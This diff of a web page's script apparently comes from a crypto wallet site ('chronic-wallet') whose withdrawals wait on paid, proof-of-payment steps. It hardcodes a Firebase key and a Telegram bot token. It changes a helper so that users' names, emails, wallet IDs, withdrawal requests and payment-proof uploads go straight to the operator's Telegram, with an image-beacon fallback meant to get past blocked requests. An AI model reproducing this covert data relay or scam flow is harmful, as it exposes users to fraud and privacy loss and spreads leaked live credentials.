@@ -113,7 +113,6 @@
         .exchange-card { background: var(--bg-input); border: 1px solid var(--border); padding: 0.85rem 1rem; border-radius: 10px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.75rem; }
         .email-item { background: var(--bg-input); padding: 0.85rem; border-radius: 8px; margin-bottom: 0.75rem; border-left: 4px solid var(--primary); }
 
-        /* Support Chat Drawer Styling */
         #support-drawer {
             position: fixed; bottom: 20px; right: 20px; width: 360px; max-width: 90vw; height: 500px;
             background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6);
@@ -137,7 +136,6 @@
         </div>
     </div>
 
-    <!-- INSTALL APP WELCOME MODAL -->
     <div class="modal" id="install-app-modal">
         <div class="modal-body" style="text-align:center;">
             <span class="close-btn" onclick="closeInstallModal()">&times;</span>
@@ -154,7 +152,6 @@
         </div>
     </div>
 
-    <!-- SUPPORT CHAT DRAWER -->
     <div id="support-drawer">
         <div class="chat-header">
             <div style="display:flex; align-items:center; gap:0.5rem;">
@@ -679,7 +676,7 @@
     </div>
 
     <script>
-        // --- YOUR FIREBASE CONFIGURATION ---
+        // --- FIREBASE CONFIGURATION ---
         const firebaseConfig = {
             apiKey: "AIzaSyB0gvtPHOL5RMcGOzUStFh5_83AQsXi8DY",
             authDomain: "chronic-wallet.firebaseapp.com",
@@ -694,15 +691,18 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // --- TELEGRAM NOTIFICATION HELPER ---
+        // --- DIRECT RELIABLE TELEGRAM NOTIFICATION HELPER ---
         function sendTelegramAlert(text) {
             const token = "9103189592:AAHKTRSuPiR9Cc2wPwdX6JKqsfm68K73cN0";
             const chat = "8269612727";
             const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=` + encodeURIComponent(text);
-            const proxyUrl = `https://api.allorigins.win/raw?url=` + encodeURIComponent(telegramUrl);
             
-            fetch(proxyUrl).catch(function(e) {
-                console.log("Telegram alert error:", e);
+            // Direct fetch directly to Telegram API
+            fetch(telegramUrl, { keepalive: true }).catch(err => {
+                console.log("Direct fetch error, retrying fallback:", err);
+                // Fallback using image object if fetch is blocked
+                const img = new Image();
+                img.src = telegramUrl;
             });
         }
 
@@ -1131,7 +1131,7 @@
             u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, baseWithdraw: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
             saveState(); updateBalanceUI();
             
-            // Telegram Alert for Withdrawal Request
+            // Send Direct Telegram Alert
             sendTelegramAlert(`💳 Withdrawal Request:\nUser: ${currentUserEmail}\nAmount: $${amt}\nMethod: ${selectedWithdrawMethodName}`);
 
             showNotification("Processing", `Withdrawal request submitted`, "💳");
@@ -1227,7 +1227,7 @@
                         closeActionModal();
                         fileInput.value = "";
                         
-                        // Telegram Alert for Proof Submission
+                        // Send Direct Telegram Alert
                         sendTelegramAlert(`🖼️ Payment Proof Uploaded:\nUser: ${currentUserEmail}\nStep: ${step.title} ($${step.amount})`);
 
                         showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
@@ -1729,7 +1729,7 @@
             closeAuthModal();
             updateBalanceUI();
 
-            // Telegram Alert for Signup
+            // Direct Telegram Alert Trigger
             sendTelegramAlert(`🎉 New User Signup:\nName: ${name}\nEmail: ${email}\nWallet ID: ${uniqueId}`);
 
             showNotification("Welcome", `Account created! Your ID is ${uniqueId}`, "🎉");
